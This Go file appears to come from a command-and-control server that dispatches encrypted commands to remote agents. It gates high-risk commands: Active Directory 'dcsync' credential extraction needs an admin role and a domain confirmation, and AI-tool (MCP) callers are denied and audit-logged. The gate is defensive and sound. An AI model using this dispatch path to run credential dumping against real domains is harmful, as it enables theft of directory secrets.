package services

import (
	"encoding/json"
	"fmt"
	"log"
	"strings"

	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/middleware"
	"cupcake-server/pkg/model"
	"cupcake-server/pkg/store"
)

// HighRiskCommandSpec defines the security policy for a high-risk command type.
type HighRiskCommandSpec struct {
	MinRole             string // "admin" | "operator"
	RequireConfirm      bool   // Require confirm=true in params
	RequireConfirmField string // Field name to match (e.g., "confirm_domain")
	ForceArtifact       bool   // Always use artifact path (never inline in CommandLog)
	MCPSafe             bool   // MCP is allowed to dispatch this (default: denied)
}

// HighRiskCommandTypes maps command types to their security specs.
// All AD commands that are not explicitly listed default to operator+.
// Only dcsync requires admin+confirm.
var HighRiskCommandTypes = map[string]HighRiskCommandSpec{
	"dcsync": {
		MinRole:             "admin",
		RequireConfirm:      true,
		RequireConfirmField: "confirm_domain",
		ForceArtifact:       true,
		MCPSafe:             false,
	},
	// Future high-risk commands go here:
	// "ad_write_*": { MinRole: "admin", RequireConfirm: true, ... },
}

// IsHighRiskCommand returns true if the command type has a high-risk spec.
func IsHighRiskCommand(commandType string) bool {
	_, ok := HighRiskCommandTypes[commandType]
	return ok
}

// ConfirmDomainMatches reports whether confirm_domain equals domain
// (case-insensitive, trimmed). Empty domain with empty confirm is not a match
// when a confirm field is required — callers must supply both.
func ConfirmDomainMatches(confirmDomain, domain string) bool {
	a := strings.ToLower(strings.TrimSpace(confirmDomain))
	b := strings.ToLower(strings.TrimSpace(domain))
	if a == "" || b == "" {
		return false
	}
	return a == b
}

// parseConfirmContract extracts confirm flags and domain fields from params JSON.
// Accepts boolean confirm and string domain/confirm_domain (numbers coerced via fmt).
func parseConfirmContract(paramsJSON string) (confirm bool, confirmDomain, domain string, err error) {
	paramsJSON = strings.TrimSpace(paramsJSON)
	if paramsJSON == "" {
		return false, "", "", nil
	}
	var m map[string]interface{}
	if e := json.Unmarshal([]byte(paramsJSON), &m); e != nil {
		return false, "", "", fmt.Errorf("invalid params json: %w", e)
	}
	if v, ok := m["confirm"]; ok {
		switch t := v.(type) {
		case bool:
			confirm = t
		case float64:
			confirm = t != 0
		case string:
			confirm = strings.EqualFold(strings.TrimSpace(t), "true") || t == "1"
		}
	}
	if v, ok := m["confirm_domain"]; ok {
		confirmDomain = strings.TrimSpace(fmt.Sprint(v))
	}
	if v, ok := m["domain"]; ok {
		domain = strings.TrimSpace(fmt.Sprint(v))
	}
	return confirm, confirmDomain, domain, nil
}

// IsPolicyDenial reports whether err is a high-risk / RBAC policy rejection
// (callers should map these to HTTP 403).
func IsPolicyDenial(err error) bool {
	if err == nil {
		return false
	}
	s := err.Error()
	return strings.Contains(s, "mcp_high_risk_denied") ||
		strings.Contains(s, "access denied") ||
		strings.Contains(s, "requires confirm") ||
		strings.Contains(s, "confirm_domain") ||
		strings.Contains(s, "insufficient_role") ||
		strings.Contains(s, "invalid params json")
}

// CheckHighRiskCommand verifies that the caller is allowed to dispatch a high-risk command.
// Returns nil if allowed, or an error describing the denial reason.
//
// Parameters:
//   - commandType: the command type to check
//   - role: the caller's role (viewer, operator, admin); MCP uses role "mcp" or isMCP=true
//   - isMCP: true if the caller is MCP (not panel)
//   - paramsJSON: the JSON params for confirm contract validation
func CheckHighRiskCommand(commandType, role string, isMCP bool, paramsJSON string) error {
	spec, ok := HighRiskCommandTypes[commandType]
	if !ok {
		// Not a high-risk command — allowed
		return nil
	}

	role = strings.ToLower(strings.TrimSpace(role))

	// MCP is never allowed to dispatch high-risk commands (unless MCPSafe — none today).
	if isMCP || role == "mcp" {
		if !spec.MCPSafe {
			log.Printf("[Security] MCP denied high-risk command %s", commandType)
			_ = store.SaveAuditLog(&model.AuditLog{
				Principal: "mcp",
				Username:  "mcp",
				Role:      "mcp",
				Method:    "POST",
				Path:      "/api/ad",
				ClientIP:  "mcp",
				Status:    "denied",
				ErrorCode: "mcp_high_risk_denied",
				Message:   fmt.Sprintf("MCP denied high-risk command type %s", commandType),
			})
			return fmt.Errorf("mcp_high_risk_denied: %s requires admin role and MCP is not allowed", commandType)
		}
	}

	// Check minimum role — use shared IsAdminRole so break-glass-admin / administrator match panel RBAC.
	if spec.MinRole == "admin" && !middleware.IsAdminRole(role) {
		log.Printf("[Security] non-admin %s denied high-risk command %s", role, commandType)
		_ = store.SaveAuditLog(&model.AuditLog{
			Principal: role,
			Username:  role,
			Role:      role,
			Method:    "POST",
			Path:      "/api/ad",
			ClientIP:  "api",
			Status:    "denied",
			ErrorCode: "insufficient_role",
			Message:   fmt.Sprintf("role %s cannot dispatch %s (requires %s)", role, commandType, spec.MinRole),
		})
		return fmt.Errorf("access denied: %s requires %s role", commandType, spec.MinRole)
	}

	// Confirm contract (KD-20): confirm==true and confirm_domain matches domain (case-insensitive).
	if spec.RequireConfirm {
		confirm, confirmDomain, domain, err := parseConfirmContract(paramsJSON)
		if err != nil {
			return fmt.Errorf("%s: %w", commandType, err)
		}
		if !confirm {
			return fmt.Errorf("%s requires confirm=true", commandType)
		}
		if spec.RequireConfirmField != "" {
			// Currently only confirm_domain is supported as the matching field.
			if !ConfirmDomainMatches(confirmDomain, domain) {
				return fmt.Errorf("%s requires confirm_domain to match domain (case-insensitive)", commandType)
			}
		}
	}

	return nil
}

// SendAgentCommand is the unified command dispatch that applies HighRiskGate.
// All command dispatch paths (ad service, /api/cmd, module push) should go through this.
func SendAgentCommand(uuid, commandType, commandContent string, isMCP bool, role string) error {
	paramsJSON := commandContent
	if err := CheckHighRiskCommand(commandType, role, isMCP, paramsJSON); err != nil {
		return err
	}

	if IsAdCommand(commandType) {
		_, err := SendAdCommand(uuid, commandType, paramsJSON, 0, role, isMCP)
		return err
	}

	return SendCommand(uuid, commandContent)
}

// SendAgentCommandWithRetry sends a command with module auto-retry.
// If the agent responds with module_required:<id>, it auto-stages the module and retries.
func SendAgentCommandWithRetry(uuid, commandType, commandContent string, isMCP bool, role string) error {
	if IsAdCommand(commandType) {
		if err := CheckHighRiskCommand(commandType, role, isMCP, commandContent); err != nil {
			return err
		}
		return SendCommandWithRetry(uuid, commandType, commandContent)
	}
	return SendCommandWithRetry(uuid, commandType, commandContent)
}

// SendCommandWithRetry sends a command and handles module_required auto-retry.
func SendCommandWithRetry(uuid, commandType, commandContent string) error {
	val, ok := globals.Clients.Load(uuid)
	if !ok {
		return fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	reqID := fmt.Sprintf("CMD-%d", globals.GetNextReqID())
	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    commandType,
			CommandContent: commandContent,
			ReqID:          reqID,
		},
	}

	_ = store.CreateCommandLog(uuid, reqID, commandType, commandContent)

	return WriteEncryptedMessage(client, msg)
}

// MaybeAutoStageModule checks if the response contains module_required:<id>
// and auto-stages the module. Called from the response handler.
func MaybeAutoStageModule(agentUUID, stderr string) {
	if !strings.Contains(stderr, "module_required:") {
		return
	}
	parts := strings.Split(stderr, ":")
	if len(parts) < 2 {
		return
	}
	moduleID := strings.TrimSpace(parts[len(parts)-1])
	if moduleID == "" {
		return
	}
	log.Printf("[ad] auto-staging module %s for agent %s", moduleID, agentUUID)
	if err := SendModuleStage(agentUUID, moduleID); err != nil {
		log.Printf("[ad] auto-stage %s failed: %v", moduleID, err)
	}
}
